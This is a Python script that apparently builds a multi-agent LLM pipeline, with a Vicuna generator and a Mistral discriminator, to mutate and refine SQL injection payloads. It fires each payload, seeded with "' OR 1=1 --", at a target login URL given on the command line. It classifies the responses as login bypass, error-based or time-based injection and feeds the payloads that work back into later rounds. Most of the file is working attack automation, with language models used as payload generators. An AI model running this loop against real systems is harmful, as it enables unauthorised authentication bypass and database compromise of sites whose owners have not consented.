import time
import csv
import json
import os
import re
import argparse
from autogen import AssistantAgent
from utils.cleaner import clean_payload
from utils.test_payload import test_payload
from utils.llm_config import vicuna, mistral_lowtemp
from datetime import datetime

# === Agents ===
def create_generator_agent():
    return AssistantAgent(name="GeneratorAgent", llm_config=vicuna)

def create_discriminator_agent():
    return AssistantAgent(
        name="DiscriminatorAgent",
        system_message="""
You are a security testing expert.
Return ONLY a valid JSON object with fields:
classification, reasoning, improvement, improved_payload.
Do NOT add markdown, commentary, or quotes outside the JSON.
classification must be one of:
["Login Bypass","Error-based SQL Injection","Time-based SQL Injection","No Effect","Invalid Payload"].
""",
        llm_config=mistral_lowtemp
    )

# === JSON Extractor ===
def extract_json(content):
    content = re.sub(r"```[a-zA-Z]*", "", content).replace("```", "").strip()
    match = re.search(r"\{.*\}", content, re.DOTALL)
    if not match:
        return None
    try:
        return json.loads(match.group(0))
    except json.JSONDecodeError:
        return None

# === Seed Payloads ===
def load_seed_payloads(path="datasets/multi_agent_output/discriminator(2)_results_sql_payloads.csv"):
    if not os.path.exists(path):
        return ["' OR 1=1 --"]
    payloads = set()
    with open(path, newline='') as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            if row.get("payload"):
                payloads.add(row["payload"].strip())
    return list(payloads)[:5] or ["' OR 1=1 --"]

# === Validate Payload ===
def validate_payload(payload):
    if not isinstance(payload, str) or payload.strip() == "":
        return False
    p = payload.lower()
    if any(term in p for term in ["vbnet", "terminate", "nan"]):
        return False
    sql_terms = ["select", "union", "or", "--", ";", "'"]
    return any(term in p for term in sql_terms)

# === Run Generator ===
def run_generator(generator, base_payloads, payload_count=5):
    gen_prompt = f"""
Modify these payloads to increase effectiveness:
{chr(10).join(base_payloads)}

Output {payload_count} unique raw SQL injection payloads:
- Raw payload only, one per line.
- No numbering, no commentary, no markdown.
"""
    reply = generator.generate_reply(messages=[{"role": "user", "content": gen_prompt}], max_tokens=512)
    return reply.get("content", "").strip().splitlines()

# === Run Discriminator ===
def run_discriminator(discriminator, payload, http_response, elapsed, last_working_payload):
    analysis_prompt = f"""
Payload: {payload}
HTTP Status: {http_response.status_code}
Response Time: {elapsed:.2f}s

Last working payload (for fallback): {last_working_payload}

If this payload failed, improve using last working payload as base.
Otherwise, improve this payload directly.

Return JSON ONLY with keys:
- classification (string)
- reasoning (string)
- improvement (string)
- improved_payload (string)
"""
    for _ in range(2):  # retry once if parse fails
        response = discriminator.generate_reply(messages=[{"role": "user", "content": analysis_prompt}], max_tokens=512)
        parsed = extract_json(response.get("content", "").strip())
        if parsed:
            return parsed
        analysis_prompt = "Your last output was invalid. Return ONLY valid JSON with the required keys."
    return {
        "classification": "ParseError",
        "reasoning": response.get("content", ""),
        "improvement": "Retry improvement",
        "improved_payload": "' OR 1=1 --"
    }

# === Helper ===


# === Main Conversation ===
def run_conversation(url, iterations=5, payloads_per_iteration=5, output_file="datasets/multi_agent_output/conversation_dataset.csv", seed_mode="dataset"):
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    generator = create_generator_agent()
    discriminator = create_discriminator_agent()

    # initial seed only if dataset mode
    seed_payloads = load_seed_payloads() if seed_mode == "dataset" else ["' OR 1=1 --"]

    prev_payloads = set()
    improved_payload_bank = []
    last_working_payload = "' OR 1=1 --"

    with open(output_file, "w", newline="") as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=[
            "iteration", "payload", "classification", "reasoning", "improvement", "improved_payload", "test_result"
        ])
        writer.writeheader()

        for i in range(iterations):
            print(f"\n=== Iteration {i+1}/{iterations} ===")
            # if improved mode, only use improved payload chain
            base_payloads = improved_payload_bank[-5:] if (seed_mode == "improved" and improved_payload_bank) else seed_payloads
            raw_payloads = run_generator(generator, base_payloads, payloads_per_iteration)

            payloads = [clean_payload(p) for p in raw_payloads if validate_payload(p)]
            if improved_payload_bank:
                payloads.insert(0, improved_payload_bank[-1])
            payloads = [p for p in payloads if p not in prev_payloads]
            if not payloads:
                payloads = ["' OR 1=1 --"]

            new_payloads = set(payloads) - prev_payloads
            if i > 0:
                print(f"New payloads added in iteration {i+1}: {len(new_payloads)}")
                for p in new_payloads:
                    print(f"  + {p}")
            prev_payloads.update(payloads)

            for payload in payloads:
                start = time.time()
                http_response = test_payload(payload, start, url=url, return_http_response=True)
                elapsed = time.time() - start

                result = run_discriminator(discriminator, payload, http_response, elapsed, last_working_payload)
                writer.writerow({
                    "iteration": i+1,
                    "payload": payload,
                    "classification": result.get("classification", ""),
                    "reasoning": result.get("reasoning", ""),
                    "improvement": result.get("improvement", ""),
                    "improved_payload": result.get("improved_payload", ""),
                    "test_result": http_response.status_code
                })
                csvfile.flush()

                print(f"Payload: {payload}")
                print(f" -> Classification: {result.get('classification')}")
                print(f" -> Reasoning: {result.get('reasoning')}")
                print(f" -> Improvement: {result.get('improvement')}")
                print(f" -> Improved Payload Example: {result.get('improved_payload')}\n")

                if result.get("improved_payload"):
                    improved_payload_bank.append(result.get("improved_payload"))
                if result.get("classification") in ["Login Bypass", "Error-based", "Time-based"]:
                    last_working_payload = payload

    print(f"\nConversation complete. Results saved to {output_file}")

# === Entry Point ===
if __name__ == "__main__":
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    default_output_file = f"datasets/multi_agent_output/conversation_dataset_{timestamp}.csv"
    parser = argparse.ArgumentParser(description="Multi-Agent SQL Injection Conversation Script")
    parser.add_argument("--url", required=True, help="Target login URL")
    parser.add_argument("--iterations", type=int, default=20, help="Number of iterations")
    parser.add_argument("--payloads", type=int, default=20, help="Payloads per iteration")
    parser.add_argument("--output", default=default_output_file, help="Output CSV file")
    parser.add_argument("--seed_mode", choices=["dataset", "improved"], default="dataset", help="Choose whether to start from dataset payloads or only improved payload chain")
    args = parser.parse_args()

    run_conversation(url=args.url, iterations=args.iterations, payloads_per_iteration=args.payloads, output_file=args.output, seed_mode=args.seed_mode)